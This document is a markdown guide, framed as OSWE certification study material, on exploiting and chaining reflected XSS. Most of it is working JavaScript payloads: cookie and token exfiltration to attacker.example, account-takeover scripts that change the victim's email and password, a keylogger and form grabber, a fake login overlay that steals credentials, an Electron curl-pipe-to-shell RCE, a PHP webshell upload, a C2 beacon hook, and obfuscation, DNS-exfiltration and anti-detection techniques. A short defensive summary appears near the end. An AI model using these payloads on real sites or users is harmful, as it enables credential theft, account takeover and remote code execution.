# Reflected XSS Exploitation & Chaining (OSWE Depth)

> Educational/defensive analysis for authorized penetration testing and certification study (OSWE-style). All payloads use placeholder hosts (`attacker.example`, `TARGET`) and must only be used in scoped, authorized engagements.

---

## 0. Recon & Triage (before chaining)

- Confirm reflection context: HTML body, attribute (`"`, `'`, unquoted), JS string, URL, CSS, SVG/MathML, template literal.
- Identify encoding/filtering: which chars are blocked (`<`, `>`, `"`, `'`, `/`, `(`, `)`, spaces), WAF rules, length limits.
- Determine execution: is there a CSP? HttpOnly flags? SameSite? Token storage location?
- Goal: turn a "pop alert(1)" into impact (ATO, RCE, data exfil). Chain selection depends on context.

---

## 1. Session Hijacking: `document.cookie` and HttpOnly Bypass

### Reality check on HttpOnly
- `HttpOnly` cookies are **not readable by JS**. There is no direct bypass of HttpOnly via XSS in a modern browser. Any claim of "HttpOnly bypass via XSS" is false.
- Impact of XSS on HttpOnly sessions is indirect: perform actions as the victim (CSRF-with-XSS), not steal the session cookie.

### What XSS *can* steal
| Storage | Readable? | Payload |
|---|---|---|
| Non-HttpOnly cookie | Yes | `document.cookie` |
| `localStorage`/`sessionStorage` | Yes | `localStorage.getItem('token')` |
| In-DOM tokens (meta/hidden inputs/JS globals) | Yes | `document.querySelector('meta[name=csrf-token]').content` |
| JWT in memory (SPA) | Sometimes | traverse `window.__INITIAL_STATE__`, React/Vue stores |

### Payloads
```js
// Non-HttpOnly cookie exfil
fetch('https://attacker.example/c?c='+encodeURIComponent(document.cookie),{mode:'no-cors'});

// localStorage token
new Image().src='https://attacker.example/t?k='+encodeURIComponent(localStorage.getItem('auth_token')||'');

// DOM/JS global scrape
new Image().src='https://attacker.example/d?d='+encodeURIComponent(JSON.stringify(window.__CONFIG__||{}));
```

### HttpOnly alternative chains
- Use XSS to **act as the user** (CSRF bypass, since same-origin JS can read anti-CSRF tokens and submit forms).
- Session fixation / logout-login CSRF (force victim into attacker-controlled session).
- Token theft from DOM even when cookie is HttpOnly.

---

## 2. Account Takeover Flows

### 2.1 CSRF token exfiltration
Reflected XSS runs same-origin, so it can read any token in the DOM and exfil or directly use it.

```js
// Read CSRF token from meta tag and exfil
const t = document.querySelector('meta[name="csrf-token"]')?.content;
fetch('https://attacker.example/csrf?t='+encodeURIComponent(t),{mode:'no-cors'});
```

### 2.2 Direct ATO via XSS (no exfil needed)
Because XSS is same-origin, skip exfil: read token, then perform privileged POST in-place.

```js
(async () => {
  const token = document.querySelector('input[name="_token"]')?.value
             || document.querySelector('meta[name=csrf-token]')?.content;
  // Change email
  await fetch('/account/email', {
    method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':token},
    body:'email=attacker@evil.example&_token='+encodeURIComponent(token)
  });
  // Change password
  await fetch('/account/password', {
    method:'POST', credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':token},
    body:'password=NewPass123!&password_confirmation=NewPass123!&_token='+encodeURIComponent(token)
  });
})();
```

### 2.3 Exfil-then-CSRF variant (cross-origin attacker)
When the action endpoint lacks CSRF but requires a token only present in DOM: XSS exfils token to attacker server; attacker's page uses it to forge request (if CORS allows) — usually the in-place variant above is simpler and more reliable.

### ATO impact notes
- Email change → password reset → full ATO.
- Password change without current-password check → instant ATO.
- Add attacker as admin/role escalation if admin panel reachable.

---

## 3. Keylogging & Form Grabbing

```js
// Keylogger
document.addEventListener('keydown', e => {
  fetch('https://attacker.example/k?k='+encodeURIComponent(e.key)+'&u='+location.href,{mode:'no-cors'});
});

// Form grabber: capture on submit before navigation
document.addEventListener('submit', e => {
  const f = e.target;
  const data = new FormData(f);
  const obj = Object.fromEntries(data.entries());
  fetch('https://attacker.example/f', {
    method:'POST', mode:'no-cors',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({url:location.href, form:obj})
  });
}, true);

// Targeted: hook password field blur
const pw = document.querySelector('input[type=password]');
pw?.addEventListener('blur', () => {
  new Image().src='https://attacker.example/p?p='+encodeURIComponent(pw.value);
});
```

### Stealthier variant
- Buffer keystrokes, exfil on `visibilitychange`/`pagehide` or every N chars to reduce request volume.
- Use `sendBeacon` for reliability on unload.

---

## 4. Phishing via Reflected XSS (Fake Login Overlay)

Inject a full-screen overlay mimicking the site's login, capture credentials, exfil, then optionally redirect to real page to reduce suspicion.

```js
const overlay = document.createElement('div');
overlay.style = 'position:fixed;inset:0;z-index:99999;background:#fff;display:flex;align-items:center;justify-content:center;font-family:sans-serif;';
overlay.innerHTML = `
  <form id="ph" style="width:320px;padding:24px;box-shadow:0 2px 12px #0002;">
    <h2>Session expired — sign in again</h2>
    <input name="u" placeholder="Username" style="width:100%;margin:8px 0;padding:8px;" required>
    <input name="p" type="password" placeholder="Password" style="width:100%;margin:8px 0;padding:8px;" required>
    <button style="width:100%;padding:8px;">Sign in</button>
  </form>`;
document.body.appendChild(overlay);
document.getElementById('ph').addEventListener('submit', e => {
  e.preventDefault();
  const d = new FormData(e.target);
  fetch('https://attacker.example/phish', {
    method:'POST', mode:'no-cors',
    body: JSON.stringify({u:d.get('u'), p:d.get('p'), host:location.host})
  });
  // optional: remove overlay and redirect to real login
  overlay.remove();
  location.href = '/login?next='+encodeURIComponent(location.pathname);
});
```

### Hardening the lure
- Clone real site CSS/logo; match fonts.
- Trigger on specific routes (e.g., after "session timeout" message) to reduce suspicion.
- Disable original form via `pointer-events`/z-index.

---

## 5. XSS → RCE Chains

### 5.1 Electron / desktop apps
Preconditions that make XSS→RCE possible: `nodeIntegration: true`, `contextIsolation: false`, or an unsafe preload exposing `require`/IPC.

```js
// If nodeIntegration enabled
require('child_process').exec('calc.exe'); // Windows
// or
const {exec} = require('child_process');
exec('bash -c "curl https://attacker.example/s | sh"');

// If only preload bridge exposed: abuse IPC to main
window.electronAPI.runCommand?.('id'); // depends on preload API
// Generic IPC abuse
window.postMessage({type:'exec', cmd:'id'}, '*');
```

### Typical chain
1. Reflected XSS in an Electron renderer (e.g., help/search view loaded from remote URL).
2. Confirm `window.require` exists → RCE via `child_process`.
3. If `require` absent but `contextBridge` exposes file/IPC APIs → abuse to write file / invoke shell.
4. Persistence: write to startup/autostart, scheduled task, or modify app config.

### 5.2 Admin panels (web)
XSS in an admin-facing page → chain with admin-only functionality:
- Trigger file upload endpoint → upload webshell (if no validation) → RCE.
- Modify server config / template injection → RCE.
- Invoke backup/restore → overwrite files.
- SSRF via admin "fetch URL" feature → internal service exploitation.
- Combine with IDOR/CSRF to act as admin without cookie theft.

```js
// Admin XSS: trigger a privileged action endpoint
fetch('/admin/users/1/promote', {method:'POST', credentials:'include', headers:{'X-CSRF-Token':token}});
// Upload webshell via admin upload
const fd = new FormData();
fd.append('file', new Blob(['<?php system($_GET["c"]); ?>']), 'shell.php');
fetch('/admin/upload', {method:'POST', credentials:'include', body:fd});
```

---

## 6. BeEF-Style Hooking & Post-Exploitation

### Hook injection
```html
<script src="https://attacker.example/hook.js"></script>
```
Reflected variant:
```
https://target.example/search?q=%3Cscript%20src%3D%22https%3A%2F%2Fattacker.example%2Fhook.js%22%3E%3C%2Fscript%3E
```

### What the hook enables
- Persistent zombie (periodic callback to C2).
- Browser fingerprinting, plugin/extension enumeration.
- Port scanning internal network (timing-based).
- Social engineering modules (fake updates, phishing overlays).
- Exploit delivery (browser CVEs) — requires matching version.
- Pivot to internal apps via victim's browser (CSRF/SSRF amplification).

### Minimal custom hook (no BeEF)
```js
setInterval(() => {
  fetch('https://attacker.example/beacon?id='+encodeURIComponent(navigator.userAgent)+'&u='+encodeURIComponent(location.href),{mode:'no-cors'});
}, 5000);
```

---

## 7. Stealth & Evasion

### 7.1 Obfuscation
```js
// String.fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41));
// atob
eval(atob('YWxlcnQoMSk='));
// split/join
[].constructor.constructor('ale'+'rt(1)')();
// Template literal / tagged
Function`a${'lert(1)'}```;
// Unicode escapes
\u0061\u006c\u0065\u0072\u0074(1);
```

### 7.2 Exfil channels
| Channel | Notes |
|---|---|
| `new Image().src` | GET, no CORS, stealthy, length-limited by URL |
| `fetch(..., mode:'no-cors')` | POST allowed, opaque response |
| `navigator.sendBeacon` | Reliable on unload |
| DNS exfil | Encode data in subdomain of attacker-controlled DNS; no HTTP logs on target side |
| WebRTC | STUN/TURN leaks; data channels |
| `link rel=prefetch` | Prefetch to attacker URL with data in query |
| WebSocket | If allowed by CSP/connect-src |
| `postMessage` to opener/parent | If window.opener exists |

DNS exfil example:
```js
const data = btoa(localStorage.getItem('t')||'').replace(/=+$/,'').replace(/\+/g,'-').replace(/\//g,'_');
new Image().src = 'https://'+data.slice(0,60)+'.exfil.attacker.example/x';
```

### 7.3 CSP exfil channels
Even with strict CSP, common bypasses/exfil paths:
- `img-src *` or data: → image exfil.
- `connect-src` allowing attacker domain → fetch.
- `script-src` with `unsafe-inline`/`unsafe-eval` → execution.
- Dangling markup injection into allowed `script-src`/`style-src` contexts.
- JSONP endpoints on whitelisted domains → script gadget.
- `base-uri` not set → inject `<base href="https://attacker.example/">` to hijack relative script loads.
- CSP report-uri/report-to → attacker receives reports (data in `document-uri`/blocked-uri, limited but usable for exfil of small tokens via crafted violations).
- `media-src`, `font-src` permissive → media/font exfil.
- Service Worker (if registerable) → intercept.

CSP bypass payload example (base-uri):
```html
<base href="https://attacker.example/">
<!-- relative <script src="/app.js"> now loads attacker's script -->
```

### 7.4 Anti-detection
- Avoid `alert`/`prompt` (noisy). Use no-op or console.
- Delay execution (`setTimeout`) to evade naive scanners.
- Conditional execution (only run if not already hooked, check `window.__hooked`).
- Use legitimate-looking filenames (`analytics.js`, `jquery.min.js`).
- Minimize DOM mutations; clean up after exfil.

---

## Defensive Countermeasures (summary)

- Output encoding per context (HTML, attr, JS, URL, CSS); use framework auto-escaping.
- Strict CSP: `default-src 'self'; script-src 'self' 'nonce-...'`; set `base-uri 'none'`; avoid `unsafe-inline/eval`.
- HttpOnly + Secure + SameSite on session cookies; store tokens in HttpOnly cookies, not localStorage.
- CSRF tokens bound to session, validated on state-changing requests; SameSite=Lax/Strict.
- Input validation + WAF as defense-in-depth (not primary).
- Electron: `contextIsolation: true`, `nodeIntegration: false`, strict preload, validate IPC.
- Admin panels: separate origin, MFA, least privilege, CSP, no XSS in admin surfaces.
- Monitoring: CSP violation reports, anomalous outbound requests, DOM mutation observers.

---

## OSWE-Style Chain Template

1. **Entry**: reflected param `q` unencoded into HTML body.
2. **Primitive**: script execution in victim browser (same origin).
3. **Escalation**: read CSRF token → POST password change (or token theft from localStorage).
4. **Impact**: account takeover / admin action / RCE (if desktop/admin).
5. **Evidence**: HTTP request logs, changed credentials, beacon callbacks.
6. **Remediation**: context-aware encoding + CSP + HttpOnly cookies.

---

*End of analysis.*
